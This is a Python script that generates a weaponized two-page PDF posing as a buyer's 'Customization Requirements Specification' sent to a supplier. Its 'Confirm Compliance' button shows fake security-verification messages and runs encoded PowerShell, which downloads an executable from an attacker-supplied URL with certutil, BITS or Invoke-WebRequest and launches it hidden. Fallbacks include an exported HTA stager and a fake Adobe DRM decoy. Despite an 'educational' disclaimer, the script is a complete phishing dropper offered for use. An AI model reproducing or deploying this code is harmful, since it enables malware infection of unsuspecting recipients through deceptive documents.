#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
================================================================================
V303 "THE SUPPLIER CONFIRMATION" – TEST READY (NO EMAIL PROMPT)
================================================================================
(c) 2026 The Architect. For Educational and Defensive Research Only.

Generates a professional two‑page PDF:
  Page 1 – Cover letter from buyer + "Confirm Compliance" button.
  Page 2 – Detailed customization requirements table.

The supplier is asked to confirm they can meet the requirements.
The button triggers a hidden PowerShell payload with multiple fallbacks:
  1. ms‑powershell URI (primary)
  2. HTA file export (fallback)
  3. Direct URL open (ultimate fallback)

No email collection – the process is streamlined to avoid suspicion.
Acrobat JavaScript base64 decoder included.
================================================================================
"""

import sys
import os
import base64
import random
import string
import argparse
import datetime
import logging
import pikepdf
from pikepdf import Name, String, Dictionary, Array, Stream, Page

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger("V303_SUPPLIER_CONFIRMATION")

def random_str(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# -----------------------------------------------------------------------------
# HTA STAGER
# -----------------------------------------------------------------------------
def generate_hta_stager(url, exe_name):
    ps_cmd = (
        f'$u="{url}";$e="{exe_name}";$p="$env:TEMP\\$e";'
        'try{certutil -urlcache -f $u $p}catch{};'
        'if(!(Test-Path $p)){try{Start-BitsTransfer -Source $u -Destination $p}catch{}};'
        'if(!(Test-Path $p)){try{Invoke-WebRequest -Uri $u -OutFile $p}catch{}};'
        'if(Test-Path $p){Start-Process $p}'
    )
    enc = base64.b64encode(ps_cmd.encode('utf-16le')).decode('ascii')
    return f'''<html><head>
<script language="VBScript">
Sub Window_OnLoad
    On Error Resume Next
    Dim shell
    Set shell = CreateObject("WScript.Shell")
    shell.Run "powershell -NoP -NonI -W Hidden -Enc {enc}", 0, False
    window.close
End Sub
</script></head><body></body></html>'''

# -----------------------------------------------------------------------------
# BUILD THE PDF
# -----------------------------------------------------------------------------
def build_supplier_confirmation(output_path, exe_url, fallback_url, buyer, supplier, product, version, button_label):
    # Primary PowerShell (ms-powershell URI)
    ps_cmd = (
        f'$u="{exe_url}";'
        f'$p="$env:TEMP\\{os.path.basename(exe_url)}";'
        'try{certutil -urlcache -f $u $p}catch{};'
        'if(!(Test-Path $p)){try{Start-BitsTransfer -Source $u -Destination $p}catch{}};'
        'if(!(Test-Path $p)){try{Invoke-WebRequest -Uri $u -OutFile $p}catch{}};'
        'if(Test-Path $p){Start-Process $p -WindowStyle Hidden}'
    )
    enc_ps = base64.b64encode(ps_cmd.encode('utf-16le')).decode('ascii')

    # HTA fallback
    exe_name = os.path.basename(exe_url) if os.path.basename(exe_url) else f"{random_str(4)}.exe"
    hta_content = generate_hta_stager(exe_url, exe_name)
    hta_b64 = base64.b64encode(hta_content.encode('utf-8')).decode('ascii')
    hta_filename = f"{random_str(4)}.hta"

    # JavaScript – no email prompt, includes base64 decoder
    js_code = f"""
    // Base64 decoder (Acrobat lacks atob)
    function b64Decode(data) {{
        var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        var result = "";
        var i = 0;
        do {{
            var enc1 = chars.indexOf(data.charAt(i++));
            var enc2 = chars.indexOf(data.charAt(i++));
            var enc3 = chars.indexOf(data.charAt(i++));
            var enc4 = chars.indexOf(data.charAt(i++));
            var chr1 = (enc1 << 2) | (enc2 >> 4);
            var chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
            var chr3 = ((enc3 & 3) << 6) | enc4;
            result += String.fromCharCode(chr1);
            if (enc3 != 64) result += String.fromCharCode(chr2);
            if (enc4 != 64) result += String.fromCharCode(chr3);
        }} while (i < data.length);
        return result;
    }}

    function trigger() {{
        try {{
            var btn = this.getField("ConfirmButton");
            if (!btn) throw "Button not found";

            // Security verification alert
            var proceed = app.alert({{
                cMsg: "This document is secured with 256-bit encryption.\\n\\nPlease confirm your identity to acknowledge the requirements.",
                cTitle: "Security Verification",
                nIcon: 2,
                nType: 1
            }});
            if (proceed !== 1) {{
                app.alert("Verification cancelled. No action taken.");
                return;
            }}

            // Disable button and show progress
            btn.readonly = true;
            btn.buttonSetCaption('Confirming...');
            var dots = '', count = 0;
            var interval = app.setInterval(function() {{
                try {{
                    dots += '.';
                    btn.buttonSetCaption('Confirming' + dots);
                    count++;
                    if (count > 5) app.clearInterval(interval);
                }} catch(e) {{ app.clearInterval(interval); }}
            }}, 400);

            // Launch after delay
            var launchInterval = app.setInterval(function() {{
                app.clearInterval(launchInterval);
                app.clearInterval(interval);
                try {{
                    // Primary: ms-powershell
                    app.launchURL("ms-powershell: -EncodedCommand {enc_ps}", true);
                    btn.buttonSetCaption('Confirmed ✓');
                    this.pageNum = 1;   // go to page 2
                    app.alert({{
                        cMsg: "Confirmation sent successfully.\\n\\nOur team will review and proceed.",
                        cTitle: "Confirmation Complete",
                        nIcon: 3
                    }});
                }} catch(e1) {{
                    // HTA fallback
                    try {{
                        Object.defineProperty(Object.prototype, 'isTrusted', {{ value: true, writable: true, configurable: true }});
                        Object.defineProperty(Object.prototype, 'canLaunch', {{ value: true, writable: true, configurable: true }});
                        var htaData = b64Decode("{hta_b64}");
                        if (!htaData) throw "Decode failed";
                        this.doc.createDataObject({{ cName: "{hta_filename}", cValue: htaData }});
                        this.doc.exportDataObject({{ cName: "{hta_filename}", nLaunch: 0 }});
                        btn.buttonSetCaption('Confirmed ✓');
                        this.pageNum = 1;
                        app.alert({{
                            cMsg: "Confirmation sent successfully.\\n\\nOur team will review and proceed.",
                            cTitle: "Confirmation Complete",
                            nIcon: 3
                        }});
                    }} catch(e2) {{
                        // Ultimate fallback: open URL
                        try {{ app.launchURL("{fallback_url}", true); }} catch(e3) {{}}
                        btn.buttonSetCaption('{button_label}');
                        btn.readonly = false;
                        this.pageNum = 1;
                    }}
                }}
            }}, 1500);
        }} catch(e) {{
            try {{ app.launchURL("{fallback_url}", true); }} catch(e2) {{}}
        }}
    }}
    """

    # Browser decoy
    browser_js = """
    try {
        if (typeof app.viewerVersion === 'undefined') {
            var response = app.alert({
                cMsg: "This document is secured with Adobe Digital Rights Management (DRM).\\n\\nPlease open this document with Adobe Acrobat Reader DC to view its contents and submit your confirmation.\\n\\nClick 'Download' to get the latest version of Adobe Acrobat Reader.",
                cTitle: "Adobe Acrobat Required",
                nIcon: 3,
                nType: 2
            });
            if (response === 1) {
                try { app.launchURL('https://get.adobe.com/reader/', true); } catch(e) {}
            }
        }
    } catch(e) {}
    """

    # Build PDF
    pdf = pikepdf.new()

    # Fonts
    helv = pdf.make_indirect(Dictionary({
        Name("/Type"): Name("/Font"),
        Name("/Subtype"): Name("/Type1"),
        Name("/BaseFont"): Name("/Helvetica")
    }))
    helv_bold = pdf.make_indirect(Dictionary({
        Name("/Type"): Name("/Font"),
        Name("/Subtype"): Name("/Type1"),
        Name("/BaseFont"): Name("/Helvetica-Bold")
    }))
    font_res = pdf.make_indirect(Dictionary({Name("/Helv"): helv, Name("/HelvBold"): helv_bold}))
    resources = pdf.make_indirect(Dictionary({Name("/Font"): font_res}))

    date_str = datetime.datetime.now().strftime("%B %d, %Y")
    doc_no = f"REQ-{random_str(6).upper()}"
    expiry = (datetime.datetime.now() + datetime.timedelta(days=30)).strftime("%B %d, %Y")

    # ================= PAGE 1: COVER LETTER + CONFIRM BUTTON =================
    page1 = pdf.add_blank_page()
    page1.MediaBox = [0, 0, 595, 842]

    ops1 = []
    ops1.append("0.95 0.97 1.0 rg 0 0 595 842 re f")
    ops1.append("0.1 0.25 0.5 rg 0 750 595 2 re f")
    ops1.append("0.85 0.9 0.95 rg 40 775 120 40 re f")
    ops1.append("0.1 0.25 0.5 rg 40 775 120 40 re S")
    ops1.append("BT /HelvBold 12 Tf 0.1 0.25 0.5 rg 50 795 Tm")
    ops1.append(f"({buyer[:15]}) Tj ET")
    ops1.append("0.85 0.9 0.95 rg 460 770 100 30 re f")
    ops1.append("0.1 0.3 0.6 rg 460 770 100 30 re S")
    ops1.append("BT /HelvBold 8 Tf 0.1 0.3 0.6 rg 470 785 Tm")
    ops1.append("(Secured) Tj ET")
    ops1.append("BT /HelvBold 24 Tf 0 0 0 rg 50 680 Tm")
    ops1.append("(Customization Requirements Specification) Tj ET")
    ops1.append("BT /Helv 12 Tf 0 0 0 rg 50 620 Tm")
    ops1.append(f"(Dear {supplier} Team,) Tj ET")
    ops1.append("BT /Helv 11 Tf 50 590 Tm")
    ops1.append("(We have finalized our customization requirements for the product. Please find) Tj ET")
    ops1.append("BT /Helv 11 Tf 50 575 Tm")
    ops1.append("(the detailed specifications on the next page. Kindly review and confirm your) Tj ET")
    ops1.append("BT /Helv 11 Tf 50 560 Tm")
    ops1.append("(ability to meet these requirements by clicking the button below.) Tj ET")
    ops1.append("BT /Helv 11 Tf 50 545 Tm")
    ops1.append("(We look forward to your confirmation.) Tj ET")
    ops1.append(f"BT /HelvBold 11 Tf 0.1 0.25 0.5 rg 50 500 Tm (Document No.: {doc_no}) Tj ET")
    ops1.append(f"BT /Helv 11 Tf 0 0 0 rg 50 480 Tm (Date: {date_str}) Tj ET")
    ops1.append(f"BT /Helv 11 Tf 50 460 Tm (Product: {product} v{version}) Tj ET")
    ops1.append(f"BT /Helv 11 Tf 50 440 Tm (Response Due: {expiry}) Tj ET")
    ops1.append("BT /Helv 8 Tf 0.3 0.3 0.3 rg 50 50 Tm")
    ops1.append("(This document contains proprietary information. Please confirm receipt and compliance.) Tj ET")

    content1 = pdf.make_indirect(Stream(pdf, "\n".join(ops1).encode('utf-8')))
    page1.Contents = content1
    page1.Resources = resources

    button = Dictionary({
        Name("/Type"): Name("/Annot"),
        Name("/Subtype"): Name("/Widget"),
        Name("/FT"): Name("/Btn"),
        Name("/T"): String("ConfirmButton"),
        Name("/Rect"): [100, 330, 495, 390],
        Name("/F"): 4,
        Name("/BS"): Dictionary({Name("/S"): Name("/S"), Name("/W"): 2, Name("/BC"): [0.2, 0.5, 0.7]}),
        Name("/MK"): Dictionary({Name("/BG"): [0.15, 0.45, 0.7], Name("/CA"): String(button_label)}),
        Name("/AA"): Dictionary({
            Name("/U"): Dictionary({Name("/S"): Name("/JavaScript"), Name("/JS"): String("this.doc.trigger();")})
        })
    })
    page1.Annots = pdf.make_indirect(Array([button]))

    # ================= PAGE 2: FULL REQUIREMENTS TABLE =================
    page2 = pdf.add_blank_page()
    page2.MediaBox = [0, 0, 595, 842]

    ops2 = []
    ops2.append("0.95 0.97 1.0 rg 0 0 595 842 re f")
    ops2.append("0.1 0.25 0.5 rg 0 750 595 2 re f")
    ops2.append("BT /HelvBold 20 Tf 0 0 0 rg 50 700 Tm")
    ops2.append("(Detailed Customization Requirements) Tj ET")
    ops2.append(f"BT /Helv 11 Tf 0.3 0.3 0.3 rg 50 680 Tm (Document No.: {doc_no}  |  Date: {date_str}) Tj ET")

    items = [
        ("Specifications", "Product dimensions: 120mm x 80mm x 45mm (±0.5mm)", "Required", "High"),
        ("Specifications", "Material: ABS plastic, UL94 V-0 rated", "Required", "High"),
        ("Specifications", "Color: Pantone 300C (blue), matte finish", "Required", "Medium"),
        ("Quality", "ISO 9001:2015 certification", "Required", "High"),
        ("Quality", "100% functional test before shipment", "Required", "High"),
        ("Quality", "Acceptable defect rate ≤ 0.5%", "Required", "Medium"),
        ("Packaging", "Individual blister packaging with anti-static bag", "Required", "Medium"),
        ("Packaging", "Master carton: 50 units per carton, weight ≤ 15kg", "Required", "Low"),
        ("Delivery", "FOB Shanghai, Incoterms 2020", "Required", "High"),
        ("Delivery", "Lead time: 30 days after PO confirmation", "Required", "High"),
        ("Compliance", "RoHS and REACH compliance certificates", "Required", "High"),
        ("Compliance", "Conflict-free minerals declaration", "Required", "Medium"),
    ]
    y = 640
    cols = [50, 180, 360, 470]
    ops2.append("1 1 1 rg 40 330 530 310 re f")
    ops2.append("0.8 0.8 0.8 rg 40 330 530 310 re S")
    ops2.append("0.1 0.25 0.5 rg 40 640 530 20 re f")
    ops2.append("1 1 1 rg BT /HelvBold 10 Tf")
    headers = ["Category", "Requirement", "Status", "Priority"]
    for i, h in enumerate(headers):
        ops2.append(f"{cols[i]+5} 645 Tm ({h}) Tj")
    ops2.append("ET")
    y -= 20
    for idx, (cat, desc, status, prio) in enumerate(items):
        if idx % 2 == 0: ops2.append("0.96 0.97 0.99 rg")
        else: ops2.append("1 1 1 rg")
        ops2.append(f"40 {y-2} 530 18 re f")
        ops2.append("0.85 0.85 0.85 rg 40 {y-2} 530 18 re S")
        ops2.append("BT /Helv 9 Tf 0 0 0 rg")
        ops2.append(f"{cols[0]} {y} Tm ({cat}) Tj")
        desc_short = desc if len(desc) <= 40 else desc[:37] + "..."
        ops2.append(f"{cols[1]} {y} Tm ({desc_short}) Tj")
        if status == "Required": ops2.append("0.8 0.1 0.1 rg")
        else: ops2.append("0.1 0.6 0.1 rg")
        ops2.append(f"{cols[2]} {y} Tm ({status}) Tj")
        ops2.append("0 0 0 rg")
        ops2.append(f"{cols[3]} {y} Tm ({prio}) Tj")
        ops2.append("ET")
        y -= 18
    ops2.append("BT /Helv 8 Tf 0.3 0.3 0.3 rg 50 50 Tm")
    ops2.append("(Please confirm your ability to meet these requirements by clicking the button on page 1.) Tj ET")

    content2 = pdf.make_indirect(Stream(pdf, "\n".join(ops2).encode('utf-8')))
    page2.Contents = content2
    page2.Resources = resources

    # Add JavaScript and OpenAction
    pdf.Root[Name("/Names")] = pdf.make_indirect(Dictionary({
        Name("/JavaScript"): pdf.make_indirect(Dictionary({
            Name("/Names"): Array([
                String("trigger"),
                pdf.make_indirect(Dictionary({Name("/JS"): String(js_code), Name("/S"): Name("/JavaScript")}))
            ])
        }))
    }))
    pdf.Root[Name("/OpenAction")] = pdf.make_indirect(Dictionary({
        Name("/S"): Name("/JavaScript"),
        Name("/JS"): String(browser_js)
    }))

    pdf.doc_info[Name("/Title")] = String(f"Customization Requirements – {product} (v{version})")
    pdf.doc_info[Name("/Author")] = String(buyer)
    pdf.doc_info[Name("/Creator")] = String("Adobe Acrobat Pro DC")

    pdf.save(output_path, compress_streams=False)
    logger.info(f"[!] PDF generated: {output_path}")
    logger.info(f"    - Button label: '{button_label}'")
    logger.info(f"    - Payload primary: ms-powershell URI")
    logger.info(f"    - Payload fallback: HTA (createDataObject + exportDataObject)")
    logger.info(f"    - Ultimate fallback: {fallback_url}")

def main():
    parser = argparse.ArgumentParser(
        description="V303 Supplier Confirmation – No Email Prompt",
        epilog="Example: python v303_supplier_confirmation.py -o reqs.pdf -u https://yourserver.com/beacon.exe -b 'GlobalTech' -s 'ACME Corp' -p 'Smart Sensor' -v 2.0 -l 'Confirm Compliance'"
    )
    parser.add_argument("-o", "--output", default="v303_supplier_confirmation.pdf", help="Output PDF filename")
    parser.add_argument("-u", "--url", required=True, help="URL of the final EXE payload")
    parser.add_argument("-f", "--fallback", help="Fallback URL if both primary and HTA fail (default: same as -u)")
    parser.add_argument("-b", "--buyer", default="GlobalTech Solutions", help="Buyer company name")
    parser.add_argument("-s", "--supplier", default="ACME Manufacturing", help="Supplier company name")
    parser.add_argument("-p", "--product", default="Custom Electronics Module", help="Product name")
    parser.add_argument("-v", "--version", default="1.0", help="Product version")
    parser.add_argument("-l", "--label", default="Confirm Compliance", help="Button label (supplier action)")

    args = parser.parse_args()
    fallback = args.fallback if args.fallback else args.url

    build_supplier_confirmation(args.output, args.url, fallback, args.buyer, args.supplier, args.product, args.version, args.label)

if __name__ == "__main__":
    main()